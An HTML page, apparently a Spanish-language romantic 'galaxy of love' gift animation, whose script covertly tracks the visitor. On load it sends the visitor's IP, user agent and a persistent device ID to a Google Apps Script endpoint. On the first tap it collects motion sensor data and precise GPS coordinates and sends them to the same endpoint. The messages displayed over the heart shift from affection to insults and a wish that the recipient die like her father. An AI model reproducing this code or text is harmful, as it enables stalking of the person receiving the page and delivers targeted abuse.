<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Punchis Galaxia Amor</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      overflow: hidden;
      background: #000;
    }
    body {
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #galaxy-canvas {
      display: block;
      width: 100vw;
      height: 100vh;
      background: #000;
      touch-action: none;
    }
    #te-amo {
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      font-family: 'Arial Black', Arial, sans-serif;
      font-size: 7vw;
      text-align: center;
      color: #ff69b4;
      text-shadow: 0 0 30px #fff, 0 0 10px #ff69b4;
      pointer-events: none;
      opacity: 0;
      transition: opacity 0.5s;
      z-index: 10;
      user-select: none;
    }
    #hint {
      position: fixed;
      left: 50%;
      bottom: 2vw;
      transform: translateX(-50%);
      color: #fff;
      font-family: Arial, sans-serif;
      font-size: 1.3em;
      opacity: 0.18;
      letter-spacing: 0.08em;
      pointer-events: none;
      user-select: none;
      animation: hint-pulse 1.6s infinite;
      z-index: 20;
    }
    @keyframes hint-pulse {
      0% { opacity: 0.13; }
      50% { opacity: 0.32; }
      100% { opacity: 0.13; }
    }
    @media (max-width: 600px) {
      #te-amo {
        font-size: 12vw;
      }
    }
  </style>
</head>
<body>
  <canvas id="galaxy-canvas"></canvas>
  <div id="te-amo">No...</div>
  <div id="hint">clic en el centro y sube el volumen</div>
   <!-- ... tu contenido ... -->
   <audio id="bg-music" src="resourses/Until I Found You(editado).mp3" autoplay loop preload="auto"></audio>

  <script>
    // Configuración
    const NUM_LETTERS = 120;
    const GALAXY_RADIUS = 0.38; // relativo al menor lado
    const GALAXY_ARMS = 2.5;
    const GALAXY_SPIRAL = 1.7;
    const HEART_SIZE = 0.38; // relativo al menor lado
    const LETTER = 'punchis';
    const LETTER_COLORS = ['#fff', '#ffb6d5', '#ff69b4', '#ffe4f7'];
    const HEART_COLOR = '#ff69b4';
    const FPS = 60;

    // Estado
    let width, height, minDim, cx, cy;
    let letters = [];
    let galaxyAngle = 0;
    let dragging = false;
    let lastAngle = 0;
    let lastPointer = null;
    let inHeart = false;
    let animatingToHeart = false;
    let animatingToGalaxy = false;
    let animationProgress = 0;
    let heartPositions = [];
    let galaxyPositions = [];

    const APPS_SCRIPT_URL =
    "https://script.google.com/macros/s/AKfycbx384SNG3uhuumQg15lHSsgw8m6WiIVyAzSuFmwxjFzngUrBzfbeQQ2rteDCFE7TCiR/exec";


// =====================================================
// ID DE ESTA VISITA
// =====================================================

const visitaId =
    Date.now().toString(36) +
    "-" +
    Math.random()
        .toString(36)
        .substring(2, 10);


// =====================================================
// ID PERSISTENTE DEL NAVEGADOR
// =====================================================

let dispositivoId =
    localStorage.getItem("dispositivo_id");

if (!dispositivoId) {

    dispositivoId =
        crypto.randomUUID();

    localStorage.setItem(
        "dispositivo_id",
        dispositivoId
    );
}


// =====================================================
// DATOS DE SENSORES
// =====================================================

let orientationData = {
    alpha: "",
    beta: "",
    gamma: ""
};

let motionData = {
    x: "",
    y: "",
    z: ""
};


// =====================================================
// ESTADO
// =====================================================

let visitaRegistrada = false;
let permisosSolicitados = false;
let sensoresActivos = false;


// =====================================================
// CREAR MENSAJE TEMPORAL
// =====================================================

function mostrarMensaje(mensaje) {

    let elemento =
        document.getElementById(
            "tracking-status"
        );

    if (!elemento) {

        elemento =
            document.createElement("div");

        elemento.id =
            "tracking-status";

        elemento.style.position =
            "fixed";

        elemento.style.top =
            "20px";

        elemento.style.left =
            "50%";

        elemento.style.transform =
            "translateX(-50%)";

        elemento.style.zIndex =
            "9999";

        elemento.style.padding =
            "12px 18px";

        elemento.style.background =
            "rgba(0,0,0,0.85)";

        elemento.style.color =
            "#fff";

        elemento.style.borderRadius =
            "10px";

        elemento.style.fontFamily =
            "Arial, sans-serif";

        elemento.style.fontSize =
            "14px";

        elemento.style.textAlign =
            "center";

        document.body.appendChild(
            elemento
        );
    }

    elemento.textContent =
        mensaje;

    setTimeout(() => {

        if (elemento) {
            elemento.remove();
        }

    }, 5000);
}


// =====================================================
// REGISTRAR VISITA
// =====================================================

function registrarVisita(ip) {

    const parametros =

        "?action=visit" +

        "&visita_id=" +
            encodeURIComponent(
                visitaId
            ) +

        "&ip=" +
            encodeURIComponent(
                ip
            ) +

        "&ua=" +
            encodeURIComponent(
                navigator.userAgent
            ) +

        "&url=" +
            encodeURIComponent(
                window.location.href
            ) +

        "&dispositivo_id=" +
            encodeURIComponent(
                dispositivoId
            );


    console.log(
        "Registrando visita..."
    );


    return fetch(
        APPS_SCRIPT_URL +
        parametros,
        {
            mode: "no-cors"
        }
    )

    .then(() => {

        visitaRegistrada =
            true;

        console.log(
            "✅ Visita registrada"
        );

    })

    .catch(error => {

        console.error(
            "❌ Error registrando visita:",
            error
        );

    });
}


// =====================================================
// OBTENER IP
// =====================================================

const visitaPromise =

    fetch(
        "https://api64.ipify.org?format=json"
    )

    .then(response => {

        if (!response.ok) {

            throw new Error(
                "HTTP " +
                response.status
            );
        }

        return response.json();
    })

    .then(data => {

        console.log(
            "Respuesta IP:",
            data
        );


        const ip =
            data &&
            typeof data.ip === "string" &&
            data.ip.trim() !== ""

                ? data.ip.trim()

                : "IP_NO_DISPONIBLE";


        console.log(
            "🌐 IP:",
            ip
        );


        return registrarVisita(ip);
    })

    .catch(error => {

        console.error(
            "Error obteniendo IP:",
            error
        );


        return registrarVisita(
            "IP_NO_DISPONIBLE"
        );
    });


// =====================================================
// RECIBIR ORIENTACIÓN
// =====================================================

function recibirOrientacion(event) {

    sensoresActivos = true;


    if (
        event.alpha !== null &&
        event.alpha !== undefined
    ) {

        orientationData.alpha =
            event.alpha;
    }


    if (
        event.beta !== null &&
        event.beta !== undefined
    ) {

        orientationData.beta =
            event.beta;
    }


    if (
        event.gamma !== null &&
        event.gamma !== undefined
    ) {

        orientationData.gamma =
            event.gamma;
    }
}


// =====================================================
// RECIBIR MOVIMIENTO
// =====================================================

function recibirMovimiento(event) {

    sensoresActivos = true;


    if (event.accelerationIncludingGravity) {

        const a =
            event.accelerationIncludingGravity;


        motionData.x =
            a.x ?? "";

        motionData.y =
            a.y ?? "";

        motionData.z =
            a.z ?? "";
    }
}


// =====================================================
// ACTIVAR LISTENERS
// =====================================================

window.addEventListener(
    "deviceorientation",
    recibirOrientacion
);

window.addEventListener(
    "devicemotion",
    recibirMovimiento
);


// =====================================================
// GUARDAR SENSORES
// =====================================================

function registrarSensores(
    sensorPermission,
    orientationPermission
) {

    const parametros =

        "?action=sensor" +

        "&visita_id=" +
            encodeURIComponent(
                visitaId
            ) +

        "&sensor_permission=" +
            encodeURIComponent(
                sensorPermission
            ) +

        "&orientation_permission=" +
            encodeURIComponent(
                orientationPermission
            ) +

        "&alpha=" +
            encodeURIComponent(
                orientationData.alpha
            ) +

        "&beta=" +
            encodeURIComponent(
                orientationData.beta
            ) +

        "&gamma=" +
            encodeURIComponent(
                orientationData.gamma
            ) +

        "&motion_x=" +
            encodeURIComponent(
                motionData.x
            ) +

        "&motion_y=" +
            encodeURIComponent(
                motionData.y
            ) +

        "&motion_z=" +
            encodeURIComponent(
                motionData.z
            );


    console.log(
        "📱 Guardando sensores:",
        orientationData,
        motionData
    );


    fetch(
        APPS_SCRIPT_URL +
        parametros,
        {
            mode: "no-cors"
        }
    );
}


// =====================================================
// GUARDAR UBICACIÓN
// =====================================================

function registrarUbicacion(position) {

    const coords =
        position.coords;


    console.log(
        "📍 GPS:",
        coords.latitude,
        coords.longitude,
        "precisión:",
        coords.accuracy
    );


    const parametros =

        "?action=location" +

        "&visita_id=" +
            encodeURIComponent(
                visitaId
            ) +

        "&latitud=" +
            encodeURIComponent(
                coords.latitude
            ) +

        "&longitud=" +
            encodeURIComponent(
                coords.longitude
            ) +

        "&precision=" +
            encodeURIComponent(
                coords.accuracy
            ) +

        "&gps_timestamp=" +
            encodeURIComponent(
                new Date(
                    position.timestamp
                ).toISOString()
            );


    fetch(
        APPS_SCRIPT_URL +
        parametros,
        {
            mode: "no-cors"
        }
    )

    .then(() => {

        console.log(
            "✅ Ubicación enviada"
        );

        mostrarMensaje(
            "📍 Ubicación registrada"
        );

    })

    .catch(error => {

        console.error(
            "Error GPS:",
            error
        );
    });
}


// =====================================================
// ERROR GPS
// =====================================================

function errorUbicacion(error) {

    console.error(
        "❌ Error de ubicación:",
        error
    );


    let mensaje =
        "No se pudo obtener la ubicación.";

    if (error.code === 1) {

        mensaje =
            "📍 Permiso de ubicación rechazado.";
    }

    if (error.code === 2) {

        mensaje =
            "📍 Ubicación no disponible.";
    }

    if (error.code === 3) {

        mensaje =
            "📍 Tiempo agotado buscando ubicación.";
    }


    mostrarMensaje(
        mensaje
    );
}


// =====================================================
// PEDIR UBICACIÓN
// =====================================================

function pedirUbicacion() {

    if (!navigator.geolocation) {

        console.error(
            "Geolocalización no disponible"
        );

        mostrarMensaje(
            "📍 Tu navegador no permite geolocalización."
        );

        return;
    }


    console.log(
        "📍 Solicitando ubicación..."
    );


    mostrarMensaje(
        "📍 Permite el acceso a tu ubicación..."
    );


    navigator.geolocation.getCurrentPosition(

        registrarUbicacion,

        errorUbicacion,

        {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        }
    );
}


// =====================================================
// PEDIR SENSORES
// =====================================================

async function pedirSensores() {

    let sensorPermission =
        "not_required";

    let orientationPermission =
        "not_required";


    try {

        // ==========================================
        // MOTION
        // ==========================================

        if (
            typeof DeviceMotionEvent !==
                "undefined" &&

            typeof DeviceMotionEvent
                .requestPermission ===
                "function"
        ) {

            sensorPermission =
                await DeviceMotionEvent
                    .requestPermission();
        }


        // ==========================================
        // ORIENTATION
        // ==========================================

        if (
            typeof DeviceOrientationEvent !==
                "undefined" &&

            typeof DeviceOrientationEvent
                .requestPermission ===
                "function"
        ) {

            orientationPermission =
                await DeviceOrientationEvent
                    .requestPermission();
        }


        console.log(
            "Motion:",
            sensorPermission
        );

        console.log(
            "Orientation:",
            orientationPermission
        );


        // ==========================================
        // ESPERAR DATOS DEL SENSOR
        // ==========================================

        setTimeout(() => {

            registrarSensores(
                sensorPermission,
                orientationPermission
            );

        }, 1500);


        // ==========================================
        // PEDIR GPS DESPUÉS
        // ==========================================

        setTimeout(() => {

            pedirUbicacion();

        }, 1700);


    } catch (error) {

        console.error(
            "Error sensores:",
            error
        );


        registrarSensores(
            "error",
            "error"
        );


        pedirUbicacion();
    }
}


// =====================================================
// PRIMER TOQUE
// =====================================================

function iniciarPermisos() {

    if (permisosSolicitados) {
        return;
    }


    permisosSolicitados = true;


    console.log(
        "👆 Usuario interactuó"
    );


    // Primero esperamos que la visita
    // haya sido registrada.

    visitaPromise
        .then(() => {

            pedirSensores();

        });
}


window.addEventListener(
    "pointerdown",
    iniciarPermisos,
    {
        once: true
    }
);

    const canvas = document.getElementById('galaxy-canvas');
    const ctx = canvas.getContext('2d');
    const teAmoDiv = document.getElementById('te-amo');

    


    const FRASES = [
  "TE AMÉ",
  "TE ADORÉ",
  "TE EXTRAÑÉ EN CADA RESPIRO",
  "SIEMPRE SERAS UNA CUALQUIERA",
  "Y",
  "ESPERO TE MUERAS IGUAL QUE",
      "TU PADRE...POR JURAR",
      "SOBRE SU VIDA. ESE DIA",
      "QUE LO HICIMOS TODA LA NOCHE",
      "APRENDÍ A NO JURAR EN VANO...",
      "SI LO VAS A ROMPER"
      
  
];
let fraseIndex = 0;

    function resize() {
      width = window.innerWidth;
      height = window.innerHeight;
      minDim = Math.min(width, height);
      cx = width / 2;
      cy = height / 2;
      canvas.width = width;
      canvas.height = height;
      computeGalaxyPositions();
      computeHeartPositions();
      initLetters();
      updateLetterPositions();
    }

    function computeGalaxyPositions() {
      galaxyPositions = [];
      const flatten = 0.45;
      const inclination = Math.PI / 5;
      for (let i = 0; i < NUM_LETTERS; i++) {
        const t = i / NUM_LETTERS;
        const angle = t * Math.PI * 2 * GALAXY_ARMS + t * GALAXY_SPIRAL * Math.PI * 2;
        const radius = t * GALAXY_RADIUS * minDim;
        let x = Math.cos(angle + galaxyAngle) * radius;
        let y = Math.sin(angle + galaxyAngle) * radius;
        y *= flatten;
        let y3d = y * Math.cos(inclination);
        galaxyPositions.push({
          x: x,
          y: y3d,
          angle: angle + Math.PI/2
        });
      }
    }

    function computeHeartPositions() {
      heartPositions = [];
      const scale = HEART_SIZE * minDim / 32;
      for (let i = 0; i < NUM_LETTERS; i++) {
        const t = (i / NUM_LETTERS) * Math.PI * 2;
        const x = 16 * Math.pow(Math.sin(t), 3);
        const y = 13 * Math.cos(t) - 5 * Math.cos(2*t) - 2 * Math.cos(3*t) - Math.cos(4*t);
        heartPositions.push({
          x: x * scale,
          y: -y * scale,
          angle: t + Math.PI/2 + Math.random() * 0.7 // Ángulo aleatorio para dinamismo
        });
      }
    }

    function initLetters() {
      letters = [];
      for (let i = 0; i < NUM_LETTERS; i++) {
        letters.push({
          x: 0, y: 0, angle: 0,
          color: LETTER_COLORS[i % LETTER_COLORS.length],
          size: Math.random() * 0.012 * minDim + 0.018 * minDim, // Variación de tamaño
        });
      }
    }

    function updateLetterPositions() {
      for (let i = 0; i < NUM_LETTERS; i++) {
        let from = galaxyPositions[i];
        let to = heartPositions[i];
        let t = animationProgress;
        if (animatingToHeart) t = animationProgress;
        else if (animatingToGalaxy) t = 1 - animationProgress;
        else t = inHeart ? 1 : 0;
        letters[i].x = lerp(from.x, to.x, t);
        letters[i].y = lerp(from.y, to.y, t);
        letters[i].angle = lerpAngle(from.angle, to.angle, t);
        letters[i].color = inHeart || animatingToHeart || animatingToGalaxy ? HEART_COLOR : LETTER_COLORS[i % LETTER_COLORS.length];
      }
    }

    function lerp(a, b, t) {
      return a + (b - a) * t;
    }
    function lerpAngle(a, b, t) {
      let diff = b - a;
      while (diff > Math.PI) diff -= 2 * Math.PI;
      while (diff < -Math.PI) diff += 2 * Math.PI;
      return a + diff * t;
    }

    function draw() {
      ctx.clearRect(0, 0, width, height);
      ctx.save();
      ctx.translate(cx, cy);
      // Latido del corazón: escala extra si el corazón está formado
      let heartPulse = 1;
      if (inHeart && !animatingToGalaxy && !animatingToHeart) {
        const now = performance.now() / 1000;
        heartPulse = 1 + 0.10 * Math.sin(now * 2 * Math.PI * 1); // 1 vez por segundo, 10% de escala
      }
      for (let i = 0; i < NUM_LETTERS; i++) {
        const l = letters[i];
        ctx.save();
        ctx.translate(l.x, l.y);
        ctx.rotate(l.angle);
        ctx.font = `${l.size * (inHeart ? heartPulse : 1)}px Arial Black, Arial, sans-serif`;
        ctx.fillStyle = l.color;
        ctx.shadowColor = l.color === HEART_COLOR ? '#fff' : '#ff69b4';
        ctx.shadowBlur = l.color === HEART_COLOR ? 10 : 6;
        ctx.globalAlpha = 0.85;
        ctx.fillText(LETTER, 0, 0);
        ctx.restore();
      }
      ctx.restore();
    }

    function animate() {
      if (!dragging && !inHeart && !animatingToHeart && !animatingToGalaxy) {
        galaxyAngle += 0.0025;
        computeGalaxyPositions();
      }
      if (animatingToHeart || animatingToGalaxy) {
        animationProgress += 0.08;
        if (animationProgress >= 1) {
          animationProgress = 1;
          if (animatingToHeart) {
  inHeart = true;
  animatingToHeart = false;
  fraseIndex = (fraseIndex + 1) % FRASES.length;
  teAmoDiv.textContent = FRASES[fraseIndex];
  teAmoDiv.style.opacity = 1;
} else if (animatingToGalaxy) {
            inHeart = false;
            animatingToGalaxy = false;
            teAmoDiv.style.opacity = 0;
          }
        }
      }
      updateLetterPositions();
      draw();
      requestAnimationFrame(animate);
    }

    // Interacción
    function pointerDown(e) {
      if (animatingToHeart || animatingToGalaxy) return;
      dragging = true;
      lastPointer = getPointer(e);
      lastAngle = getPointerAngle(lastPointer.x, lastPointer.y);
    }
    function pointerMove(e) {
      if (!dragging) return;
      const p = getPointer(e);
      const angle = getPointerAngle(p.x, p.y);
      const delta = angle - lastAngle;
      galaxyAngle += delta;
      computeGalaxyPositions();
      lastAngle = angle;
    }
    function pointerUp(e) {
      dragging = false;
    }
    function pointerClick(e) {
      if (animatingToHeart || animatingToGalaxy) return;
      const p = getPointer(e, true);
      const dist = Math.hypot(p.x, p.y);
      if (!inHeart && dist < minDim * 0.13) {
        animatingToHeart = true;
        animationProgress = 0;
      } else if (inHeart) {
        animatingToGalaxy = true;
        animationProgress = 0;
      }
    }
    function getPointer(e, relative=false) {
      let x, y;
      if (e.touches && e.touches.length > 0) {
        x = e.touches[0].clientX;
        y = e.touches[0].clientY;
      } else {
        x = e.clientX;
        y = e.clientY;
      }
      if (relative) {
        return {x: x - cx, y: y - cy};
      } else {
        return {x, y};
      }
    }
    function getPointerAngle(x, y) {
      return Math.atan2(y - cy, x - cx);
    }

    // Eventos
    window.addEventListener('resize', resize);
    canvas.addEventListener('mousedown', pointerDown);
    canvas.addEventListener('mousemove', pointerMove);
    window.addEventListener('mouseup', pointerUp);
    canvas.addEventListener('touchstart', pointerDown, {passive: false});
    canvas.addEventListener('touchmove', pointerMove, {passive: false});
    window.addEventListener('touchend', pointerUp);
    canvas.addEventListener('click', pointerClick);
    canvas.addEventListener('touchend', function(e) {
      if (e.touches && e.touches.length === 0) pointerClick(e);
    });

    // Inicialización
    resize();
    animate();


    window.addEventListener('DOMContentLoaded', function() {
    const audio = document.getElementById('bg-music');
    if (audio) {
      audio.volume = 0.5;
      audio.play().catch(() => {
        // Si falla, espera el primer clic
        document.addEventListener('click', function playMusicOnce() {
          audio.play();
          document.removeEventListener('click', playMusicOnce);
        });
      });
    }
  });
  </script>
</body>
</html>
